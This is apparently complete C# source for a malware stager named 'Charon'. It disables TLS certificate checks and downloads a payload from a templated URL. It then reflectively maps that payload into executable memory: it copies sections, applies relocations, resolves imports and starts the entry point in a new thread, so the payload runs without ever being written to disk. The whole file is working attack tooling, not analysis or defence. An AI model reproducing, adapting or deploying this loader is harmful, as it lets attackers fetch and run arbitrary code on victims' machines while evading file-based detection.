using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace Charon
{
    internal static class Log
    {
        static string path = Path.Combine(Path.GetTempPath(), "charon.log");
        public static void W(string msg)
        {
            try { File.AppendAllText(path, msg + "\n"); } catch {}
        }
        public static void W(string fmt, params object[] args)
        {
            W(string.Format(fmt, args));
        }
    }

    public class Stager
    {
        public static void Main()
        {
            Execute();
        }

        public static void Execute()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;

            try
            {
                Log.W("[*] Downloading payload...");
                byte[] peBytes;
                using (WebClient wc = new WebClient())
                {
                    peBytes = wc.DownloadData("%DOWNLOAD_URL%");
                }
                Log.W("[+] Downloaded {0} bytes", peBytes.Length);

                PEMapper.Execute(peBytes);
            }
            catch (Exception ex)
            {
                Log.W("[-] Stager error: {0}", ex.ToString());
            }
        }
    }

    internal static class PEMapper
    {
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const ushort IMAGE_REL_BASED_DIR64 = 10;
        const ushort IMAGE_REL_BASED_HIGHLOW = 3;
        const ushort IMAGE_REL_BASED_ABSOLUTE = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr lpProcName);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        public static void Execute(byte[] payload)
        {
            // --- Validate PE ---
            if (payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D)
            {
                Log.W("[-] Invalid PE: bad MZ");
                return;
            }

            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
            if (BitConverter.ToUInt32(payload, e_lfanew) != 0x00004550)
            {
                Log.W("[-] Invalid PE signature");
                return;
            }

            int optOff = e_lfanew + 24;
            ushort magic = BitConverter.ToUInt16(payload, optOff);
            if (magic != 0x20B)
            {
                Log.W("[-] Not PE32+ (x64)");
                return;
            }

            uint entryPointRva = BitConverter.ToUInt32(payload, optOff + 16);
            long preferredBase = BitConverter.ToInt64(payload, optOff + 24);
            uint sizeOfImage = BitConverter.ToUInt32(payload, optOff + 56);
            uint sizeOfHeaders = BitConverter.ToUInt32(payload, optOff + 60);
            ushort numSections = BitConverter.ToUInt16(payload, e_lfanew + 6);
            ushort optHeaderSize = BitConverter.ToUInt16(payload, e_lfanew + 20);

            Log.W("[+] PE: ImageBase=0x{0:X} Size=0x{1:X} EP=0x{2:X} Sections={3}",
                preferredBase, sizeOfImage, entryPointRva, numSections);

            // --- Allocate memory ---
            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, sizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (baseAddr == IntPtr.Zero)
            {
                Log.W("[-] VirtualAlloc failed: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Log.W("[+] Allocated at 0x{0:X}", (long)baseAddr);

            // --- Copy headers ---
            Marshal.Copy(payload, 0, baseAddr, (int)sizeOfHeaders);

            // --- Copy sections ---
            int sectionTable = e_lfanew + 24 + optHeaderSize;
            for (int i = 0; i < numSections; i++)
            {
                int shdr = sectionTable + (i * 40);
                uint va = BitConverter.ToUInt32(payload, shdr + 12);
                uint rawSize = BitConverter.ToUInt32(payload, shdr + 16);
                uint rawPtr = BitConverter.ToUInt32(payload, shdr + 20);

                if (rawSize == 0 || rawPtr == 0) continue;

                Marshal.Copy(payload, (int)rawPtr, (IntPtr)((long)baseAddr + va), (int)rawSize);
                Log.W("[+] Section {0}: VA=0x{1:X} Size=0x{2:X}", i, va, rawSize);
            }

            // --- Process relocations ---
            long delta = (long)baseAddr - preferredBase;
            if (delta != 0)
            {
                Log.W("[*] Relocation delta: 0x{0:X}", delta);
                // Relocation directory is at optional header offset 152 (data directory index 5)
                uint relocRva = BitConverter.ToUInt32(payload, optOff + 152);
                uint relocSize = BitConverter.ToUInt32(payload, optOff + 156);

                if (relocRva > 0 && relocSize > 0)
                {
                    int relocCount = 0;
                    IntPtr relocBase = (IntPtr)((long)baseAddr + relocRva);
                    uint offset = 0;

                    while (offset < relocSize)
                    {
                        uint blockRva = (uint)Marshal.ReadInt32(relocBase, (int)offset);
                        uint blockSize = (uint)Marshal.ReadInt32(relocBase, (int)offset + 4);

                        if (blockSize == 0) break;

                        uint numEntries = (blockSize - 8) / 2;
                        for (uint j = 0; j < numEntries; j++)
                        {
                            ushort entry = (ushort)Marshal.ReadInt16(relocBase, (int)offset + 8 + (int)(j * 2));
                            ushort type = (ushort)(entry >> 12);
                            ushort off = (ushort)(entry & 0xFFF);

                            if (type == IMAGE_REL_BASED_DIR64)
                            {
                                IntPtr patchAddr = (IntPtr)((long)baseAddr + blockRva + off);
                                long val = Marshal.ReadInt64(patchAddr);
                                Marshal.WriteInt64(patchAddr, val + delta);
                                relocCount++;
                            }
                            else if (type == IMAGE_REL_BASED_HIGHLOW)
                            {
                                IntPtr patchAddr = (IntPtr)((long)baseAddr + blockRva + off);
                                int val = Marshal.ReadInt32(patchAddr);
                                Marshal.WriteInt32(patchAddr, val + (int)delta);
                                relocCount++;
                            }
                        }

                        offset += blockSize;
                    }
                    Log.W("[+] Applied {0} relocations", relocCount);
                }
                else
                {
                    Log.W("[!] No relocation table — binary may crash");
                }
            }
            else
            {
                Log.W("[+] No relocations needed (loaded at preferred base)");
            }

            // --- Resolve imports ---
            // Import directory is at optional header offset 120 (data directory index 1)
            uint importRva = BitConverter.ToUInt32(payload, optOff + 120);
            uint importSize = BitConverter.ToUInt32(payload, optOff + 124);

            if (importRva > 0)
            {
                int importCount = 0;
                int idt = (int)importRva; // offset into mapped image
                int entrySize = 20; // IMAGE_IMPORT_DESCRIPTOR size

                while (true)
                {
                    IntPtr idtAddr = (IntPtr)((long)baseAddr + idt);
                    uint originalFirstThunk = (uint)Marshal.ReadInt32(idtAddr, 0);
                    uint nameRva = (uint)Marshal.ReadInt32(idtAddr, 12);
                    uint firstThunk = (uint)Marshal.ReadInt32(idtAddr, 16);

                    if (nameRva == 0) break;

                    string dllName = Marshal.PtrToStringAnsi((IntPtr)((long)baseAddr + nameRva));
                    IntPtr hModule = LoadLibraryA(dllName);

                    if (hModule == IntPtr.Zero)
                    {
                        Log.W("[-] Failed to load: {0}", dllName);
                        idt += entrySize;
                        continue;
                    }

                    uint thunkRva = originalFirstThunk != 0 ? originalFirstThunk : firstThunk;
                    uint iatRva = firstThunk;
                    int funcCount = 0;

                    while (true)
                    {
                        IntPtr thunkAddr = (IntPtr)((long)baseAddr + thunkRva);
                        IntPtr iatAddr = (IntPtr)((long)baseAddr + iatRva);
                        long thunkVal = Marshal.ReadInt64(thunkAddr);

                        if (thunkVal == 0) break;

                        IntPtr funcAddr;
                        if ((thunkVal & (1L << 63)) != 0)
                        {
                            // Import by ordinal
                            int ordinal = (int)(thunkVal & 0xFFFF);
                            funcAddr = GetProcAddress(hModule, (IntPtr)ordinal);
                        }
                        else
                        {
                            // Import by name (skip 2-byte hint)
                            IntPtr nameAddr = (IntPtr)((long)baseAddr + thunkVal + 2);
                            string funcName = Marshal.PtrToStringAnsi(nameAddr);
                            funcAddr = GetProcAddress(hModule, funcName);
                        }

                        if (funcAddr == IntPtr.Zero)
                        {
                            Log.W("[-] Failed to resolve: {0}!?", dllName);
                        }

                        Marshal.WriteInt64(iatAddr, (long)funcAddr);
                        funcCount++;
                        thunkRva += 8;
                        iatRva += 8;
                    }

                    importCount++;
                    Log.W("[+] {0}: {1} functions", dllName, funcCount);
                    idt += entrySize;
                }
                Log.W("[+] Resolved imports from {0} DLLs", importCount);
            }

            // --- Execute entry point in new thread ---
            IntPtr entryPoint = (IntPtr)((long)baseAddr + entryPointRva);
            Log.W("[*] Starting thread at 0x{0:X}", (long)entryPoint);

            uint threadId;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, entryPoint, IntPtr.Zero, 0, out threadId);

            if (hThread == IntPtr.Zero)
            {
                Log.W("[-] CreateThread failed: {0}", Marshal.GetLastWin32Error());
                return;
            }

            Log.W("[+] Thread started TID={0} — payload running", threadId);

            // Wait for the thread indefinitely so the process doesn't exit
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
